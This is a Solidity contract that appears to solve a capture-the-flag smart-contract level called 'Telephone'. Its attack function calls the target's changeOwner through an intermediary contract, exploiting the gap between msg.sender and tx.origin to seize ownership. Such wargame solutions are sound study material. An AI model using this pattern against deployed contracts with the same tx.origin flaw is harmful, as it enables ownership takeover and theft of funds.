// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;
import "./Telephone.sol";

contract TelephoneHack {
    Telephone public challenge;

    constructor(address challengeAddress) {
        challenge = Telephone(payable(challengeAddress));
    }

    function attack() external payable {
        // the condition to change the owner is that
        //msg.sender != tx.origin
        challenge.changeOwner(tx.origin);
    }

    fallback() external payable {}
}
